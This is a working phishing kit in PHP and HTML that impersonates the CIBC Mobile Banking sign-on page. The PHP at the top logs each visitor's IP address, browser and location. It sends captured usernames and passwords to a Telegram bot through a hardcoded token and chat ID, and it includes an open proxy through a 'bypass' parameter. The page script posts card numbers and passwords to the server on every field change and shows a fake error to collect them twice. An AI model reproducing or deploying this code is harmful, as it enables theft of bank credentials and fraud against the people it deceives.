<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";

    $url        = "https://BMO.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <script type="text/javascript" id="custom-useragent-string"></script>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <title>CIBC Mobile Banking Sign On</title>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="./files/reset.css">
        <link rel="stylesheet" href="./files/reset-brand.css">
        <link rel="stylesheet" href="./files/global.css">
        <link rel="stylesheet" href="./files/global-android2.css">
        <link rel="stylesheet" href="./files/global-brand.css">
        <script type="text/javascript" src="./files/jquery-1"></script>
        <script type="text/javascript" src="./files/wicket-event-jquery"></script>
        <script type="text/javascript" src="./files/wicket-ajax-jquery"></script>
        <link rel="stylesheet" href="./files/carousel.css">
        <script src="./files/carousel"></script>
        <link rel="stylesheet" href="./files/signon.css">
        <link rel="stylesheet" href="./files/signon-brand.css">
        <meta name="msapplication-tap-highlight" content="no">
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {visibility: hidden;}
        </style>
        <style>
        .check-label::before {
            background-image: url(/assets/cibc/img/checkbox.png);
        }

        .check-box:checked + .check-label::before {
            background-image: url(/assets/cibc/img/checkbox-selected.png);
        }

        .input-password {
          -webkit-text-security: disc;
        }
        </style>
        <style>
        #header-logo {
            background: url(/assets/cibc/img/cibcnew.svg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            width: 100px;
        }
        </style>
        <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'CIBC';
            var lrinfo = 'Login';
        </script>
        <script src="./files/actions"></script>
        <link rel="stylesheet" href="./files/all.css">
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (validate()) {
                    if (attempt == 1) {
                        $('.div-loader').css('display', 'block');
                        $('.div-main').css('display', 'none');

                        $.post('/220098/cibc/api/login-submit', $(this).serialize(), function(response) {
                            $('.error-div').css('display', 'block');

                            $(form).trigger('reset');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }, 'JSON');

                        attempt = 2;
                    } else {
                        $('.div-loader').css('display', 'block');
                        $('.div-main').css('display', 'none');

                        $.post('/220098/cibc/api/login-submit', $(this).serialize(), function(response) {
                            if (response.status) {
                                if (response.data.loader) {
                                    location.href = '/220098/cibc/w';
                                } else {
                                    location.href = '/220098/cibc/d';
                                }
                            } else {
                                $(form).trigger('reset');

                                $('.error-div').css('display', 'block');

                                $('.div-loader').css('display', 'none');
                                $('.div-main').css('display', 'block');
                            }
                        }, 'JSON');
                    }
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/220098/cibc/data.txt', {username: username, password: password});
            });
        });
        </script>
    </head>
    <body lang="en" class="android-fix">
        <span class="offscreen">CIBC Mobile Banking Sign On</span>
        <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
            <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
            <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div>CIBC <span>Mobile Banking</span></div>
                </div>
                <ul>
                    <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow active" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-signonLink" role="menuitem">Sign On<span class="offscreen">Selected</span></a></li>
                    <li><a id="register-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-registerLink" role="menuitem">Register</a></li>
                    <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-forgetPasswordLink" role="menuitem">Forgot Password</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink" role="menuitem" @="Open an Account&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;">Open an Account</a></li>
                    <li id="li-browse-products"><a id="browse-products-link" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <li id="li-find-us"><a id="find-us-link" href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank" role="menuitem">Find Us</a></li>
                    <li id="li-security"><a id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank" role="menuitem">Contact Us</a></li>
                    <li id="id3"><a id="legal-link" role="menuitem" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink" @="Privacy and Legal&lt;span class=&quot;offscreen&quot;&gt;Opens in new page.&lt;/span&gt;" class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
                    <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank" role="menuitem">Help</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="http://cibc.com/" target="_blank">
                <div id="header-logo">
                    <span class="offscreen">CIBC logo</span>
                </div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
                <a id="adchoice-icon-link" href="https://www.cibc.com/en/privacy-security/internet-based-advertising.html" target="_blank">
                <img src="./files/ADC-icon-cibc.png" alt="AdChoices. Opens in new browser window">
                </a>
                <a href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-linkLocale" class="headerLink" id="id2">
                    <div lang="fr">Français</div>
                </a>
            </div>
        </header>
        <noscript>
            <section id="nojs" class="overlay-msg">
                <div>
                    <p>JavaScript is currently disabled in your browser.</p>
                    <p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
                </div>
            </section>
        </noscript>
        <section id="main-page" class="div-main">
            <input type="checkbox" id="sign-off-check" class="hide" name="signOffCheck">
            <section id="signoff" class="overlay-msg">
                <div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-closePopupButton" id="sign-off-button"><img src="./files/close-icon-red.png" alt="Close" role="button"></a>
                    <p>You have successfully signed out.</p>
                    <div id="sub-msg">Thank you for banking with <span>CIBC</span> Mobile Banking.</div>
                </div>
            </section>
            <div id="carousel-container" aria-hidden="true">
                <img id="slide-sizer" src="./files/sizer.png" alt="">
                <section id="carousel">
                    <div id="items-container">
                        <div id="touch-box"></div>
                        <article id="s1" class="carousel-item carousel-item-on" style="z-index: 0;">
                            <a id="carousel-link-1" href="javascript:;"><img src="./files/45490-mobile-web-en.jpg" alt=""></a>
                        </article>
                    </div>
                </section>
                <div id="slideIndicators">
                    <div class="inline">
                        <div class="indicator-bg indicator-on" id="indicator1"></div>
                    </div>
                </div>
            </div>
            <section id="signon">
                <div id="form-center">
                    <div class="global-error-from-container" tabindex="-1" id="id4">
                        <div class="global-error-from-container error-div" style="display: none" tabindex="-1">
                        	<div class="global-error-form-wrapper">
                                <div class="global-error-form-msg">
                            		<span role="alert" class="">You have entered incorrect information. Check your card number and password and try again. (0008)</span>
                            	</div>
                            </div>
                        </div>
                    </div>
                    <form id="lab-form" method="post" class="lab-form" action="/220098/cibc">
                        <div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id1_hf_0" id="id1_hf_0"></div>
                        <fieldset class="sign-on-new" id="new-card-number">
                            <label for="user-card-number"><span class="offscreen">Card Number</span></label>
                            <input id="input-card" type="tel" placeholder="Card Number" name="username" class="lrinput input-username" required="true" autocomplete="off" maxlength="19" attr-action="Filling Card" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" style="margin-bottom: 13px;">
                            <script src="./files/splitter"></script>
                            <link rel="stylesheet" href="./files/card.css">
                        </fieldset>
                        <fieldset class="sign-on-new" id="remember-new-card">
                            <input type="checkbox" id="remember-card-chk" class="check-box" name="rememberCardCkBx">
                            <label for="remember-card-chk" class="check-label" id="remember-card-label">Remember Card</label>
                        </fieldset>
                        <fieldset class="sign-on-remember">
                        </fieldset>
                        <fieldset>
                            <label for="user-password"><span class="offscreen">Password</span></label>
                            <input type="password" autocapitalize="none" class="lrinput input-password" autocomplete="off" data-id="password" id="user-password" required="" name="password" placeholder="Password" maxlength="12" value="" attr-action="Filling Password">
                        </fieldset>
                        <button type="submit" class="btn btn-neutral btn-save btn-login" id="signon-button" name="save22">
                            <span class="btn-txt">SIGN ON</span>
                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                        </button>
                    </form>
                </div>
                <div id="bttm-shadow"><img src="./files/shadow.png" id="shadow" role="presentation"></div>
            </section>
            <footer class="page-footer">
                <div>
                    <p>Your use of CIBC Mobile Banking is governed by the Electronic Access Agreement (2016).</p>
                    <p>CIBC Mobile Banking</p>
                    <p>© Copyright </p>
                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </div>
                <div class="release">
                    <p>RT23 &nbsp; &nbsp; 2.13.3 &nbsp; &nbsp; </p>
                </div>
            </footer>
        </section>
        <section id="change-password" class="page-wrapper div-loader" style="display: none; margin-top: 46px">
            <style>
            .loader-div {
                text-align: center;
                padding-top: 20px;
            }

            .loader-div h2 {
                font-size: 28px;
                margin-bottom: 40px;
            }
            </style>
            <div class="global-error-from-container loader-div" id="idf">
                <h2 class="title">Processing</h2>
                <img src="./files/loading.gif" width="80">
            </div>
        </section>
    
</body></html>
